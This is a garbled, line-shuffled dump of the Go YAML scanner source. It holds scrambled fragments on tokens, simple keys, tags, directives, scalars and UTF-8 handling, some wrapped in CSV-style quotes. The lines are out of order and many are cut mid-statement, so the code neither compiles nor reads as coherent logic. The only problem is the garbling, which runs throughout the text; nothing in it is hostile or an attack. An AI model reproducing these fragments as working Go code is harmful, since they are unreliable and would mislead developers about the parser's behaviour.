// Remove the simple key.
if (parser.buffer[parser.buffer_pos] == ':' 
chomping = 
"s = append(s, byte(0xF0"
if simple_key.required {
"// Produce the SCALAR(...,single-quoted) or SCALAR(...,double-quoted) tokens."
yaml_token_t) bool {
"typ:        yaml_FLOW_ENTRY_TOKEN,"
token = parser.tokens[parser.tokens_head]
"yaml_parser_set_scanner_tag_error(parser, directive,"
"start_mark, ""did not find expected '!'"")"
// Note that if a YAML stream contains an implicit document (without '---'
// Check if any potential simple key may occupy the head position.
' in the block context.
"// Check if it is, indeed, handle."
indent = parser.indent 
"yaml_parser_t, start_mark yaml_mark_t, name "
func yaml_parser_remove_simple_key(parser 
parser.buffer[parser.buffer_pos] == ']' 
// A simple key may follow the indicators '[' and '{'.
 '!handle!suffix'
"var handle, suffix []byte"
"yaml_parser_t, column, number int, typ yaml_token_type_t, mark yaml_mark_t) bool {"
"typ:        yaml_TAG_DIRECTIVE_TOKEN,"
"token, literal) {"
//      %YAML   1.1     
"var s, leading_break, trailing_breaks []byte"
parser.mark.index 
} else if value <= 0xFFFF {
if !yaml_parser_save_simple_key(parser) {
 value > 0x10FFFF {
yaml_parser_t) bool {
"end_mark:   mark,"
//      2. Collections in a mapping:
"' and ':', which are used for denoting mapping keys and values,"
code_length = 8
//          ---
"encoding:   parser.encoding,"
 a comment 
if single 
"start_mark: parser.mark,"
// Here the Scanning step is explained and implemented.  We start with the list
" !yaml_parser_update_buffer(parser, 3) {"
//      FLOW-SEQUENCE-END               
//      DOCUMENT-START                  
 '}'
"', '""', '"
"', ':', '@', '"
"s = append(s, whitespaces...)"
// It's either the '!' tag or not really a tag handle.  If it's a %TAG
parser.token_available = false
// Create the STREAM-END token and append it to the queue.
 handle[len(handle)-1] == '!' {
"// (http://yaml.org/spec/1.2/spec.html).  We mostly follow it, although in"
w <= cap(s) {
// The following examples show flow collections:
"s = append(s, trailing_breaks...)"
"', ':', ',', ']', '}', '%', '@', '"
"is_blankz(parser.buffer, parser.buffer_pos"
case 'b':
// Increase the flow level and resize the simple key list if needed.
// Copy the head if needed.
"return yaml_parser_set_scanner_tag_error(parser, directive,"
 parser.buffer[parser.buffer_pos] == '[' 
func yaml_parser_stale_simple_keys(parser 
"//          SCALAR(""a literal scalar"",literal)"
"if !yaml_parser_scan_directive_name(parser, start_mark, "
parser.problem = problem
"// becomes less or equal to the column.  For each indentation level, append"
" yaml_parser_update_buffer(parser, length)"
"prefix:     prefix,"
case 'L': // LS (
"s = append(s, ' ')"
return parser.unread >= length 
func read_line(parser 
code_length := 0
// Add the BLOCK-SEQUENCE-START token if needed.
if parser.flow_level > 0 {
" parser.buffer[parser.buffer_pos] == ',' "
"yaml_parser_t, directive bool, context_mark yaml_mark_t, problem string) bool {"
2] == '
func yaml_parser_scan_tag_uri(parser 
"//          SCALAR(""key 2"",plain)"
// Eat the following indentation spaces and line breaks.
// Is it a YAML directive
// the block context and the current column coincides with the indentation
// We pass the information about the input stream encoding with the
length
 '---'
// Create the FLOW-ENTRY token and append it to the queue.
"start_mark, ""found unexpected non-alphabetical character"")"
"//  - is limited to a single line,"
s[len(s)-1] = parser.buffer[parser.buffer_pos]
"start_mark: start_mark,"
if !yaml_parser_decrease_flow_level(parser) {
parser.mark.index
// A simple key may follow a block scalar.
"if !yaml_parser_scan_tag_uri(parser, false, handle, start_mark, "
// Scan the leading line breaks and determine the indentation level if needed.
" is_break(parser.buffer, parser.buffer_pos"
if parser.buffer[parser.buffer_pos] == ':' 
w]...)
if parser.buffer[parser.buffer_pos] != '.' {
"s = append(s, byte(0x80"
if increment > 0 {
if parser.mark.column > max_indent {
"if !yaml_parser_scan_tag_directive_value(parser, start_mark, "
"return yaml_parser_fetch_document_indicator(parser, yaml_DOCUMENT_START_TOKEN)"
func yaml_parser_scan_version_directive_number(parser 
for parser.mark.column == indent 
 Indentation increase denoting a block
 parser.buffer[parser.buffer_pos] == ']' 
for i := range parser.simple_keys {
//          BLOCK-ENTRY
// Is it a leading whitespace
"yaml_parser_t, start_mark yaml_mark_t, major, minor "
" is_bom(parser.buffer, parser.buffer_pos) {"
token.style = yaml_DOUBLE_QUOTED_SCALAR_STYLE
"//          SCALAR(""a simple key"",plain)"
" !is_z(parser.buffer, parser.buffer_pos) {"
// Ensure that the buffer contains the required number of characters.
"end_mark:   parser.mark,"
"// and '...' indicators), no DOCUMENT-START and DOCUMENT-END tokens will be"
// increase that precedes a block collection (cf. the INDENT token in Python).
t') {
"breaks = read_line(parser, "
need_more_tokens := false
"yaml_parser_set_scanner_error(parser, ""while scanning a tag"","
w := width(parser.buffer[parser.buffer_pos])
"if !is_blankz(parser.buffer, parser.buffer_pos) {"
// Remove obsolete potential simple keys.
 increment
"// If the key is required, it is an error."
// Produce the TAG token.
// Decode the required number of characters.
"style:      yaml_PLAIN_SCALAR_STYLE,"
// It is an escape sequence.
// indicators '
// Have we found a simple key
return false
"return yaml_parser_fetch_flow_scalar(parser, true)"
"if !yaml_parser_scan_tag_uri(parser, true, nil, start_mark, "
"start_mark, ""did not find expected comment or line break"")"
code_length = 2
 buf[pos] == '-' 
// Check for an indentation indicator.
if parser.buffer[parser.buffer_pos] == '!' {
// YAML does not always require to start a new block collection from a new
"return yaml_parser_fetch_block_scalar(parser, false)"
"//          SCALAR(""a scalar"",single-quoted)"
"context = ""while scanning an anchor"""
// Copy all subsequent alphabetical and numerical characters.
// Introduction
case 'f':
// sequence of parsing events.
') {
indent < 1 {
// A simple key cannot follow a tag.
// Decode an URI-escape sequence corresponding to a single UTF-8 character.
"start_mark, ""found an indentation indicator equal to 0"")"
// Fetch the next token from the queue.
parser.simple_keys[len(parser.simple_keys)-1] = simple_key
// It wasn't a handle after all.  Scan the rest of the tag.
// STREAM-START token.
// Force new line.
// produced tokens.
 parser.buffer[parser.buffer_pos] == '.' 
handle = []byte{'!'}
func yaml_parser_decrease_flow_level(parser 
w := 1024
' indicator.  Note that
// Note that the VERSION-DIRECTIVE and TAG-DIRECTIVE tokens occupy a whole
// Check if we are allowed to start a new entry.
func yaml_parser_scan_uri_escapes(parser 
func yaml_parser_scan_directive(parser 
//          FLOW-SEQUENCE-END
"if !yaml_parser_unroll_indent(parser, parser.mark.column) {"
if parser.indent < column {
(parser.flow_level > 0 
// Create the DOCUMENT-START or DOCUMENT-END token.
// Produce the VALUE token.
"return yaml_parser_fetch_flow_collection_start(parser, yaml_FLOW_SEQUENCE_START_TOKEN)"
simple_key.mark = parser.mark
// Is it the flow sequence end indicator
func yaml_parser_scan_tag(parser 
1] == '
 Indentation decrease.
 parser.mark.column < 
// A plain scalar may start with any non-blank characters except
// Copy the character.
case 'u':
//      DOCUMENT-END
// No simple keys after the indicators ']' and '}'.
return s
"yaml_parser_set_scanner_error(parser, ""while scanning a plain scalar"","
// Consume a space or a tab character.
"// If the current position may start a simple key, save it."
0x3F)))
number -= parser.tokens_parsed
"return yaml_parser_fetch_flow_collection_start(parser, yaml_FLOW_MAPPING_START_TOKEN)"
// It is a non-escaped non-blank character.
if !parser.token_available {
if length > max_number_length {
"//          SCALAR(""item 2"",plain)"
"', or ':' (complex value)."
// Get the indentation level and eat the indicator.
parser.indent = parser.indents[len(parser.indents)-1]
"//      TAG(handle,suffix)"
func yaml_parser_scan_tag_directive_value(parser 
simple_key := yaml_simple_key_t{
"if !(is_blankz(parser.buffer, parser.buffer_pos) "
// Check if the trailing octet is correct.
"// '-', '"
if parser.flow_level == 0 {
breaks)
// Eat whitespaces.
//          STREAM-END
0] == '-' 
"//      TAG-DIRECTIVE(handle,prefix)    "
// Simple keys are allowed after '-'.
"trailing_blank = is_blank(parser.buffer, parser.buffer_pos)"
//          'a scalar'
func skip_line(parser 
// Add the BLOCK-MAPPING-START token if needed.
break // We have found a token.
"start_mark, ""could not find expected directive name"")"
"s, octet)"
 BLOCK-SEQUENCE-START is NOT produced here.
"parser.buffer[parser.buffer_pos] == ',' "
 parser.buffer[parser.buffer_pos] == '$' 
"pargs := append([]interface{}{"""
// Copy a line break character to a string buffer and advance pointers.
3]...)
// Scan a tag.
"if !yaml_parser_scan_version_directive_number(parser, start_mark, major) {"
//      BLOCK-END
if len(s) == 0 
// We are finished.
//          FLOW-MAPPING-END
"typ:        yaml_TAG_TOKEN,"
 parser.buffer[parser.buffer_pos] == ':') 
//      BLOCK-ENTRY                     
parser.buffer[parser.buffer_pos] == '%' {
// A simple key cannot follow another simple key.
// Set the scanner error and return false.
// Create a TAG-DIRECTIVE token.
// Push the current indentation level to the stack and set the new
"//          SCALAR(""item 3.1"",plain)"
// It is a right single quote.
value = (value << 4) 
 !trailing_blank 
 ']'
if w == 0 {
if len(s) == 0 {
2] == '-' 
//      STREAM-END
//      BLOCK-END                       
"//          SCALAR(""a mapping"",plain)"
"// The Scanner transforms the input stream into a sequence of tokens, while the"
// Check the value and write the character.
// Produce a VERSION-DIRECTIVE or TAG-DIRECTIVE token.
end_mark) {
PS . LS
// Create the TAG token and append it to the queue.
x85)
"token, typ) {"
func yaml_parser_fetch_stream_end(parser 
if parser.buffer[parser.buffer_pos] == '%' {
// The following series of examples illustrate the usage of these tokens:
"// For scanning block collections, the following tokens are used (note that we"
"simple_key.token_number,"
"start_mark, ""found unknown escape character"")"
int8) bool {
xC2' 
// Check if the potential simple key to be removed is required.
"typ:        yaml_BLOCK_ENTRY_TOKEN,"
if len(trailing_breaks) == 0 {
//          a mapping:
"// The Scanner is rather clever and complicated. The Parser, on the contrary,"
// Is it a directive
"is_hex(parser.buffer, parser.buffer_pos"
"//          SCALAR(""key 1"",plain)"
// parser transform the sequence of tokens produced by the Scanner into a
parser.simple_keys[len(parser.simple_keys)-1]
//          - - item 1
if leading_blanks {
"//      '0'-'9', 'A'-'Z', 'a'-'z', '_', '-', '"
// Chomp the tail.
if !yaml_parser_fetch_more_tokens(parser) {
parser.context = context
// Consume the content of the plain scalar.
func yaml_parser_fetch_value(parser 
"return yaml_parser_set_scanner_error(parser, """", parser.mark,"
//            a literal scalar
// is able to point to the context.
"start_mark, ""did not find expected tag URI"")"
"s = append(s, leading_break...)"
"//          SCALAR(""a double-quoted scalar"",double-quoted)"
// Check if we need to join whitespaces and breaks.
// Scan the directive name.
// We have already introduced the SCALAR token above.  The following tokens are
// returned to the Parser.
// Produce the BLOCK-ENTRY token.
//size_t length = head 
"s = append(s, byte(0xC0"
" as_hex(parser.buffer, parser.buffer_pos"
"context = ""while parsing a %TAG directive"""
"""mapping values are not allowed in this context"")"
 parser.buffer[parser.buffer_pos] == ')' 
// Produce the KEY token.
// Keep the handle as ''
// Check if we are allowed to start a new key (not nessesary simple).
//          STREAM-START(utf-8)
"major:      major,"
"trailing_breaks = read_line(parser, trailing_breaks)"
parser.buffer[parser.buffer_pos] == '}')) {
x07')
"for is_digit(parser.buffer, parser.buffer_pos) {"
if parser.unread < 4 
//          }
if parser.simple_keys[i].possible {
// The ':' indicator follows a complex key.
"'', '@', '%', '-', '"
if parser.buffer[parser.buffer_pos] != '!' {
code_length = 4
name) {
if !(parser.buffer[parser.buffer_pos] == '%' 
//      BLOCK-SEQUENCE-START            
"//          !!float ""3.14""  "
// The indicators '[' and '{' may start a simple key.
if parser.buffer[parser.buffer_pos] == '
// Eat the indentation spaces.
"//          SCALAR(""value 2"",plain)"
// Ensure that the buffer contains at least 4 characters.  4 is the length
// Do we need to join the lines by space
 buf[pos] == '
// Create a VERSION-DIRECTIVE token.
(value>>18)))
leading_blanks = true
"s = append(s, head[1:]...)"
 len(leading_break) > 0 
parser.buffer[parser.buffer_pos] == '>' 
"//          ALIAS(""A"")"
case 'x':
x0D')
// of the longest indicators ('--- ' and '... ').
" !is_blank(parser.buffer, parser.buffer_pos"
 '-'
parser.buffer[parser.buffer_pos] == '@' 
// YAML also permits non-indented sequences if they are included into a block
 buf[pos] == '.' 
// Eat the indicator character.
// Check for a chomping indicator.
"pargs = append([]interface{}{""---""}, args...)"
"""mapping keys are not allowed in this context"")"
"', and ':' indicators, a new"
 parser.buffer[parser.buffer_pos] == '{' 
 parser.indent == parser.mark.column
// Is it a trailing whitespace
"//          SCALAR(""item 3"",plain)"
parser.tokens_head
case '0':
"start_mark, ""did not find the expected '>'"")"
if parser.unread < code_length 
parser.buffer[parser.buffer_pos] == '[' 
parser.buffer_pos 
// Copy the octet and move the pointers.
"for is_blank(parser.buffer, parser.buffer_pos) {"
//       
x0B')
2] == '.')) 
case 'P': // PS (
//      1. Collections in a sequence:
//          a sequence:
"start_mark, ""found a tab character where an indentation space is expected"")"
// the BLOCK-END token.
2] == '.' 
func cache(parser 
// Create a token and append it to the queue.
// Consume the value.
if (
// Is it a single-quoted scalar
// The last rule is more restrictive than the specification requires.
"// the current column is greater than the indentation level.  In this case,"
1) {
// A simple key is required at the current position if the scanner is in
 len(s)
"// First, try to scan a handle."
// Consume the major version number.
// Eat the indicator '
// Eat whitespaces and comments to the end of the line.
//            - item 3.2
//          BLOCK-MAPPING-START
"', '$', ',', '.', '!', '"
// Scan the version number of VERSION-DIRECTIVE.
func yaml_parser_fetch_stream_start(parser 
// Check that the indentation is greater than 0.
func yaml_parser_fetch_flow_entry(parser 
// Repeat while the next character is digit.
// if it is followed by a non-space character.
return yaml_parser_fetch_tag(parser)
//          - 
//      BLOCK-MAPPING-START             
// CR LF . LF
// repeat KEY and VALUE here):
"//      %TAG    !yaml!  tag:yaml.org,2002:  "
"var handle, prefix []byte"
// Expect a whitespace or line break.
"start_mark, ""did not find expected digit or '.' character"")"
// Simple keys are allowed after '
// Determine the indentation level if needed.
"yaml_insert_token(parser, -1, "
//      %YAML   1.1
for {
//          {
"parser.buffer[parser.buffer_pos] == '""' "
"//          SCALAR(""value 1"",plain)"
// Loop through the indentation levels in the stack.
indent < parser.indent
return true
token)
// Scan a quoted scalar.
// Check if the trailing character is '!' and copy it.
// Scan the value of a TAG-DIRECTIVE token.
return yaml_parser_fetch_directive(parser)
//      %YAML    1.1    
// Set the handle to '!'.
1)) {
//      BLOCK-SEQUENCE-END              
"'', '(', ')', '[', ']',"
"} else if is_break(parser.buffer, parser.buffer_pos) {"
 k < code_length
if w == 1 
// Set the chomping method and eat the indicator.
case '
1] {
//      FLOW-SEQUENCE-END
yaml_FLOW_MAPPING_END_TOKEN)
"yaml_parser_t, column int) bool {"
if parser.buffer[parser.buffer_pos] == '0' {
case ' ':
"//          ANCHOR(""A"")"
 parser.buffer[parser.buffer_pos] == '%' {
parser.stream_start_produced = true
"octet := byte((as_hex(parser.buffer, parser.buffer_pos"
"s = append(s, buf[parser.buffer_pos:pos"
//      2. A flow mapping:
"// Return true on success, false on failure (reader error or memory error)."
// Allow the BOM mark to start a line.
"start_mark, ""found an incorrect trailing UTF-8 octet"")"
" !yaml_parser_update_buffer(parser, 4) {"
token_number: parser.tokens_parsed 
// Eat '%'.
// Check if the scanner is in the block context.
"yaml_parser_t, directive bool, start_mark yaml_mark_t, s "
whitespaces = whitespaces[:0]
 parser.buffer[parser.buffer_pos] == '-' {
"', and ':' correspondingly."
"', '/', '"
yaml_mark_t) bool {
func yaml_parser_fetch_directive(parser 
//          --- a plain scalar
"// LL(1) parser, as it is usually called)."
func yaml_parser_set_scanner_tag_error(parser 
return yaml_parser_fetch_plain_scalar(parser)
if !need_more_tokens {
// Check the initial '!' character.
"yaml_parser_t, directive bool, start_mark yaml_mark_t, handle "
var indent int
// The tokens BLOCK-SEQUENCE-START and BLOCK-MAPPING-START denote indentation
i := len(parser.simple_keys) - 1
"//              a simple key: a value,  "
hasTag = true
if !literal {
return yaml_parser_fetch_block_entry(parser)
return yaml_parser_fetch_value(parser)
// We have started.
// The following notes assume that you are familiar with the YAML specification
// Is it the flow mapping end indicator
// We are at the beginning of a non-empty line.
"""while scanning a simple key"", simple_key.mark,"
// An anchor or an alias could be a simple key.
parser.buffer[parser.buffer_pos] == '/' 
// Copy a character to a string buffer and advance pointers.
if typ == yaml_ANCHOR_TOKEN {
 Check if length of the anchor is greater than 0 and it is followed by
"//      '=', '"
 len(whitespaces) > 0 {
 '{'
// Check if we just started scanning.  Fetch STREAM-START then.
case '_': // 
" !update(A, B)"
// Check that there are no document indicators at the beginning of the line.
"// The tokens FLOW-SEQUENCE-START, FLOW-SEQUENCE-END, FLOW-MAPPING-START, and"
// Check for an blank character after the name.
// The dispatcher for token fetchers.
" a complex key: another value,"
//      1. A recursive sequence:
"value:      s,"
parser.indent = -1
func yaml_parser_set_scanner_error(parser 
"return yaml_parser_set_scanner_error(parser, ""while scanning a block scalar"","
"if !is_hex(parser.buffer, parser.buffer_pos"
"//  - in the block context, but not at the beginning of the line or"
"//      '%', '@', '"
"// In the block context, extra checks are required."
"""fmt"""
"var leading_blank, trailing_blank bool"
//          a simple key: a value   
// indentation level if needed.
} else if !single 
// produced.
for k := 0
"} else if is_digit(parser.buffer, parser.buffer_pos) {"
" is_tab(parser.buffer, parser.buffer_pos) {"
// Produce the ALIAS or ANCHOR token.
indent = 1
= width(parser.buffer[parser.buffer_pos])
parser.flow_level
indent == 0 {
// Check if it is a first line break.
"//          --- ""a double-quoted scalar"""
"if !yaml_parser_roll_indent(parser, simple_key.mark.column,"
// Check indentation level.
"//          SCALAR(""a sequence"",plain)"
"yaml_parser_t, directive bool, head []byte, start_mark yaml_mark_t, uri "
// Check if the number was present.
//          --- 'a single-quoted scalar'
if !single {
func yaml_parser_fetch_flow_scalar(parser 
//          FLOW-MAPPING-START
"if is_z(parser.buffer, parser.buffer_pos) {"
func yaml_parser_fetch_plain_scalar(parser 
"//  after '-', '"
 '...'
chomping = -1
// Consume blank characters.
"// In the block context, a new line may start a simple key."
// Check if we really need to fetch more tokens.
"//      %TAG    !yaml!  tag:yaml.org,2002:"
"//      VERSION-DIRECTIVE(major,minor)"
" (len(parser.tokens) - parser.tokens_head),"
"int, breaks "
// Check the indentation level against the current column.
"//          SCALAR(""a single-quoted scalar"",single-quoted)"
// Create a token and insert it into the queue.
// Get the next token.
//      FLOW-SEQUENCE-START             
//      - item 1    
"//          SCALAR(""a value"",plain)"
} else if value <= 0x7FF {
// Check the escape character.
if parser.unread < 2 
// block collection may start at the current line.  The following examples
//          : another value
if leading_blanks 
if token.typ == yaml_STREAM_END_TOKEN {
// illustrate this case:
n' {
minor) {
 The KEY token is produced here.
// Scan a block scalar.
parser.flow_level--
// level.
(parser.flow_level == 0 
skip_line(parser)
// Consume an arbitrary escape code.
parser.unread--
parser.buffer[parser.buffer_pos
parser.context_mark = context_mark
"return yaml_parser_set_scanner_error(parser, context, context_mark, problem)"
"[]byte, start_mark yaml_mark_t, end_mark "
"// The following examples show how the tokens BLOCK-SEQUENCE-START,"
"return yaml_parser_fetch_anchor(parser, yaml_ALIAS_TOKEN)"
func yaml_parser_scan_version_directive_value(parser 
[]byte) bool {
"yaml_parser_t, literal bool) bool {"
func yaml_parser_scan_tag_handle(parser 
"yaml_parser_t, typ yaml_token_type_t) bool {"
"return yaml_parser_fetch_anchor(parser, yaml_ANCHOR_TOKEN)"
end_mark := parser.mark
if len(suffix) == 0 {
return yaml_parser_fetch_stream_end(parser)
// Scope:
0xC0 != 0x80 {
// Is it a folded scalar
//      FLOW-MAPPING-START
 a whitespace character or one of the indicators:
//      3. Several documents in a stream:
if !parser.simple_key_allowed {
"whitespaces = read(parser, whitespaces)"
//          --- 
//      ANCHOR(anchor)
var name []byte
func yaml_parser_save_simple_key(parser 
// Scan a handle.
((parser.buffer[parser.buffer_pos
"//          SCALAR(""another scalar"",single-quoted)"
"""while scanning a simple key"", parser.simple_keys[i].mark,"
"// In the flow context, do nothing."
// Advance the buffer pointer.
"start_mark, ""did not find expected hexdecimal number"")"
 parser.buffer[parser.buffer_pos] == '@' 
(parser.buffer[parser.buffer_pos
"//      TAG-DIRECTIVE(handle,prefix)"
"for is_alpha(parser.buffer, parser.buffer_pos) "
"yaml_token_t, typ yaml_token_type_t) bool {"
"', '>', '"
x09')
// cannot contain simple keys anymore.
//          : key 1: value 1
x1B')
"// In the following examples, we present whole documents together with the"
// Is it the document end indicator
"//      TAG(handle,suffix)              "
// Is it the block entry indicator
"yaml_BLOCK_MAPPING_START_TOKEN, simple_key.mark) {"
// that makes detections of these tokens more complex.
parser.buffer_pos
x0C')
x20')
"var chomping, increment int"
func read(parser 
x85':
" !yaml_parser_update_buffer(parser, 1) {"
indent) 
 The '%TAG' directive.
// Initialize the scanner and produce the STREAM-START token.
if parser.mark.column != 0 {
"context := ""while scanning an alias"""
fmt.Println(pargs...)
// A plain scalar could be a simple key.
// Create the SCALAR token and append it to the queue.
//          'yet another scalar'
"s = append(s, 0)"
// the Scanner still produce the KEY token whenever it encounters a simple key.
// Append the remaining line breaks.
xA0')
yaml_parser_t) {
"// In the block context, additional checks are required."
case buf[pos] == '
// Create the FLOW-SEQUENCE-END of FLOW-MAPPING-END token.
//      
func yaml_parser_fetch_anchor(parser 
// but we let the Parser detect and report about it because the Parser
// Is it a double-quoted scalar
"if !yaml_parser_scan_flow_scalar(parser, "
// Is it the flow mapping start indicator
"//      SCALAR(""item 2"",plain)"
 a complex key
// Tokens:
"//      VERSION-DIRECTIVE(major,minor)  "
parser.buffer[parser.buffer_pos] == '
//          --- >-
parser.buffer[parser.buffer_pos] == '}' 
"start_mark, ""found an incorrect leading UTF-8 octet"")"
if directive 
// Scan the VERSION directive value.
// Consume the minor version number.
// The correspoding sequence of tokens:
// Consume non-blank characters.
// [Go] Should really be returning breaks instead.
"end_mark:   end_mark,"
// Check for '>' and eat it.
// Remove the key from the stack.
parser.mark.line
// Create the KEY token and append it to the queue.
func yaml_parser_fetch_key(parser 
import (
 parser.buffer[parser.buffer_pos] == '-' 
skip(parser)
// Eat a line break.
"""}, args...)"
// Have we found a non-empty line
//              
' or nothing (simple keys).
// Scan the block scalar content.
" !yaml_parser_update_buffer(parser, code_length) {"
xA8' 
 value <= 0xDFFF) 
"if !yaml_parser_scan_tag_uri(parser, false, nil, start_mark, "
"', '"
token.style = yaml_FOLDED_SCALAR_STYLE
"var value, length int8"
//            - item 1
if parser.simple_key_allowed {
"style:      yaml_SINGLE_QUOTED_SCALAR_STYLE,"
x2029)
// The document start and end indicators are represented by:
//          ...
yaml_FLOW_SEQUENCE_END_TOKEN)
// Pop the indentation level.
// Eat '.'.
"yaml_parser_t, start_mark yaml_mark_t, number "
"trailing_breaks, start_mark, "
"if !is_breakz(parser.buffer, parser.buffer_pos) {"
 buf[pos
if parser.stream_end_produced 
 parser.mark.column < indent {
//      BLOCK-ENTRY
"start_mark, ""did not find expected whitespace or line break"")"
 '['
xC2')
simple_key := 
// Scan a YAML-DIRECTIVE or TAG-DIRECTIVE token.
// Check if the number is too long.
if len(leading_break) > 0 
"if !yaml_parser_scan_tag_handle(parser, true, start_mark, "
token := yaml_token_t{
default:
"yaml_parser_t, indent "
"//      TAG-DIRECTIVE(""!yaml"",""tag:yaml.org,2002:"")"
// Is it a literal scalar
// Scan the value of VERSION-DIRECTIVE.
//      1. A flow sequence:
"yaml_parser_t, length int) bool {"
"return yaml_parser_fetch_document_indicator(parser, yaml_DOCUMENT_END_TOKEN)"
for parser.buffer[parser.buffer_pos] == ' ' 
"var major, minor int8"
"//          SCALAR(""item 3.2"",plain)"
 sequence or a block mapping.
const max_number_length = 2
// Is it the flow entry indicator
// Produce the FLOW-ENTRY token.
" is_break(parser.buffer, parser.buffer_pos) {"
if !parser.stream_start_produced {
//           
"var s, leading_break, trailing_breaks, whitespaces []byte"
 Implicit empty plain scalars do not produce tokens.
// are represented by the KEY and VALUE tokens.
//      Tokens:
//          
func yaml_parser_scan_directive_name(parser 
"'', '"
//      DOCUMENT-START
// Check for a document indicator.
"if !yaml_parser_scan_version_directive_value(parser, start_mark, "
} else {
hasTag := len(head) > 0
// append or insert the specified token into the token queue.
// A special case: the '!' tag.  Set the handle to '' and the
break
k) {
//      3. Various scalar styles:
//      BLOCK-SEQUENCE-START
//      ANCHOR(anchor)                  
//          - item 2
" is_blankz(parser.buffer, parser.buffer_pos"
// The tag has either the '!suffix' or the '!handle!suffix' form.
"(parser.buffer[parser.buffer_pos] == ',' "
 A scalar.
//            - item 2
 leading_break[0] == '
//      2. An explicit document:
//      FLOW-ENTRY                      
"if !yaml_parser_scan_block_scalar_breaks(parser, "
" string(s) != ""!"" {"
"return yaml_parser_fetch_flow_collection_end(parser,"
"panic(""invalid character sequence"")"
"// rest is quite straightforward.  The issues are ""block collection start"" and"
func yaml_parser_scan_flow_scalar(parser 
// Scan a tag handle.
// Ensure that the tokens queue contains enough tokens.
xA9')
// Set the initial indentation.
// CR
"start_mark, ""did not find expected whitespace"")"
//      BLOCK-MAPPING-START
"leading_break = read_line(parser, leading_break)"
"return yaml_parser_fetch_block_scalar(parser, true)"
func yaml_parser_scan_plain_scalar(parser 
// Create the STREAM-START token and append it to the queue.
// Check for a comment.
func yaml_parser_scan_to_next_token(parser 
// Scan the tag.
 parser.buffer[parser.buffer_pos] == '=' 
" ','"
// Increase the flow level.
"if !yaml_parser_scan_version_directive_number(parser, start_mark, minor) {"
 Scan a TAG token.
func yaml_parser_roll_indent(parser 
s) {
func yaml_parser_scan_anchor(parser 
indent == 0 
w = width(octet)
// LS
if parser.tokens_head == len(parser.tokens) {
"return yaml_parser_set_scanner_error(parser,"
// Check for a tab character messing the indentation.
// Append the token to the queue.
parser.buffer[parser.buffer_pos] == '!' 
//      STREAM-START(encoding)
"end_mark:   simple_key.mark,"
'' {
// flow collections:
"yaml_parser_set_scanner_error(parser, ""while parsing a quoted scalar"","
"if !yaml_parser_scan_tag(parser, "
"// In the block context, we may need to add the BLOCK-MAPPING-START token."
 The stream start.
"// mapping.  In this case, the token BLOCK-SEQUENCE-START is not produced:"
parser.simple_keys[i].possible = false
"yaml_parser_set_scanner_error(parser, ""while scanning a %TAG directive"","
"yaml_insert_token(parser, number, "
"""block sequence entries are not allowed in this context"")"
// Create a token.
// Check if we are allowed to start a complex value.
// Produce the FLOW-SEQUENCE-END or FLOW-MAPPING-END token.
//      FLOW-SEQUENCE-START
if !yaml_parser_fetch_next_token(parser) {
// Is it the value indicator
// Is it a tag
 parser.buffer[parser.buffer_pos] == '
"possible:     true,"
if handle[0] == '!' 
// Initialize the simple key stack.
)head) : 0
"if is_crlf(parser.buffer, parser.buffer_pos) {"
//      FLOW-MAPPING-END
// Pop indentation levels from the indents stack until the current level
parser.buffer[parser.buffer_pos] == '%' 
"// FLOW-MAPPING-END represent the indicators '[', ']', '{', and '}'"
// Eat '!<'
indent = increment
"// is a straightforward implementation of a recursive-descendant parser (or,"
func yaml_parser_fetch_block_scalar(parser 
"if !yaml_parser_roll_indent(parser, parser.mark.column, -1, yaml_BLOCK_SEQUENCE_START_TOKEN, parser.mark) {"
"for !is_breakz(parser.buffer, parser.buffer_pos) {"
"if !(is_blank(parser.buffer, parser.buffer_pos) "
//      KEY                             
1] == '.' 
"if parser.buffer[parser.buffer_pos] == '""' {"
"s = append(s, '""')"
"s = read(parser, s)"
leading_blanks := false
parser.tokens_parsed
if parser.mark.column == 0 
// Is it the flow sequence start indicator
"', ':'"
func yaml_parser_fetch_more_tokens(parser 
// Ensure that the buffer is initialized.
parser.simple_keys = parser.simple_keys[:len(parser.simple_keys)-1]
"!is_blankz(parser.buffer, parser.buffer_pos"
"typ:        yaml_KEY_TOKEN,"
"// If it is the leading octet, determine the length of the UTF-8 sequence."
// The next two tokens are responsible for tags:
"// The tokens BLOCK-ENTRY, KEY, and VALUE are used to represent the indicators"
"if is_blank(parser.buffer, parser.buffer_pos) {"
"', ':', ',', '[', ']', '{', '}',"
//      2. A tagged scalar:
"s = append(s, byte(value))"
"// Produce the SCALAR(...,plain) token."
//  - in the flow context
"// [Go] This was inlined: !cache(A, B) -> unread < B "
// needed.
"value:      handle,"
if (value >= 0xD800 
parser.token_available = true
 (parser.flow_level > 0 
"start_mark, ""did not find URI escaped octet"")"
if parser.simple_keys[i].required {
max_indent = parser.mark.column
 parser.buffer[parser.buffer_pos
(value
"start_mark: mark,"
"yaml_parser_t, start_mark yaml_mark_t, handle, prefix "
"typ:        yaml_VERSION_DIRECTIVE_TOKEN,"
 complex key
 The '%YAML' directive.
// Do we need to fold line breaks
uri = s
if value <= 0x7F {
if !leading_blanks {
 ':'
LF . LF
"var handle_value, prefix_value []byte"
if directive {
"indent, "
// Check the character which ends the tag.
(value>>6)))
//      '%'.
// Eat whitespaces and comments until the next token is found.
xE2' 
"yaml_parser_set_scanner_error(parser, ""while scanning a block scalar"","
} else if single 
func yaml_parser_scan_block_scalar_breaks(parser 
// Tabs are allowed:
var leading_blanks bool
// Set the indentation level if it was specified.
"//      '-', '"
"// Simple keys are allowed after ','."
token = yaml_token_t{} // [Go] Is this necessary
"yaml_parser_set_scanner_error(parser, ""while scanning a directive"","
// end of the stream:
"//      SCALAR(value,style)"
1024 < parser.mark.index) {
//      %TAG    !   !foo
"start_mark, ""did not find expected version number"")"
"//          SCALAR(""3.14"",double-quoted)"
//            key 2: value 2
"// directive, it's an error.  If it's a tag token, it must be a part of URI."
parser.mark.column = 0
for w > 0 {
"token, single) {"
"} else if bytes.Equal(name, []byte(""TAG"")) {"
xE2')
 simple_key.mark.index
 !parser.simple_key_allowed) 
"//          SCALAR(""a folded scalar"",folded)"
number = value
// of all the tokens produced by the Scanner together with short descriptions.
// A tag could be a simple key.
"style:      yaml_LITERAL_SCALAR_STYLE,"
//          'another scalar'
"minor:      minor,"
"', '!', '"
      '
if parser.buffer[parser.buffer_pos] == '-' 
"// ""simple keys"".  Both issues are explained below in details."
//      ALIAS(anchor)                   
"if !is_break(parser.buffer, parser.buffer_pos) {"
// Scan the suffix now.
switch {
if parser.buffer[parser.buffer_pos] == ']' {
suffix) {
parser.buffer[parser.buffer_pos] == ':' 
// Note that we don't copy the leading '!' character.
